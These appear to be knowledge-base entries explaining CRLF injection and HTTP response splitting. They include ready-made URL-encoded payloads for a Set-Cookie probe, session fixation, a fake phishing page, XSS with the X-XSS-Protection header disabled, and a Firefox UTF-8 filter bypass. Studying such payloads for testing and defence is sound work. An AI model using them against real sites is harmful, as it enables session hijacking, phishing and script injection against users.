entries.title: What is CRLF Injection
entries.body:
A CRLF injection occurs when an application inserts user input into an HTTP response (most often into a header) without filtering the CR and LF characters.

CR  (\r, ASCII 13) - carriage return, moves the cursor to the beginning of the line.
LF  (\n, ASCII 10) - line feed, moves the cursor to the next line.

In the HTTP protocol the CRLF sequence (\r\n) always terminates a header line. By injecting CRLF, an attacker splits the response into two parts and controls its structure. The same characters are significant in other line-based protocols too (SMTP, etc.).

entries.title: HTTP Response Splitting - the essence of the attack
entries.body:
HTTP Response Splitting is a variant of CRLF where a CR/LF injection into a response header allows you to "split" a single response into two and fully control the body/headers of the second part.

What control over the response structure leads to:
• XSS - injecting a script into the inserted response body.
• Cache poisoning - forcing the cache to store substituted content.
• Header manipulation - Set-Cookie, Location, X-XSS-Protection, etc., to mislead a user or a system.

entries.title: Where to look and how to detect
entries.body:
• The target is any parameter whose value ends up in a response header: lang, redirect/url, referrer, cookie names, custom X-headers.
• A basic probe is to inject a Set-Cookie via CRLF and check whether the header appeared in the response:
    /%0d%0aSet-Cookie:crlf=injection
• If the front-end/proxy strips \r\n - try encoding variants (single %0a, double URL-encoding, unicode bypasses - see the "Filter bypass" section).
• Confirmation: a new header line that you control has appeared in the raw response.

entries.title: Session Fixation - forcing your own cookie
entries.body:
If input of the form

    value\r\nSet-Cookie: admin=true

is inserted into the headers without sanitization, an ordinary response

    HTTP/1.1 200 OK
    Content-Type: text/html
    Set-Cookie: sessionid=abc123

turns into

    HTTP/1.1 200 OK
    Content-Type: text/html
    Set-Cookie: sessionid=value
    Set-Cookie: admin=true

The attacker has forced their own cookie onto the victim (session fixation).

entries.title: Phishing - rewrite the response body (HTTP Response Splitting)
entries.body:
The simplest way to exploit CRLF is to append a new page body (phishing or arbitrary JS).

Requested URL:

http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E

Resulting HTTP response:

Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>

entries.title: XSS - disable X-XSS-Protection and inject svg
entries.body:
A CRLF injection lets you add an X-XSS-Protection:0 header (disable the filter) and then append an HTML tag with JavaScript.

Requested URL:

http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e

In the response, after the Link: line, the injected content appears:

Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0

entries.title: Bypass via UTF-8 characters (stripping in Firefox)
entries.body:
Per RFC 7230, header values must use only a subset of US-ASCII. Firefox followed the specification and, when setting a cookie, STRIPPED out-of-range characters rather than encoding them. So a multibyte UTF-8 character whose last byte equals 0a/0d/3c/3e, after stripping, turned into \n / \r / < / >.

For example, the character 嘊 contains 0a at the tail of its hex representation (%E5%98%8A) and collapses in Firefox into \n. The character mapping is in the table below.
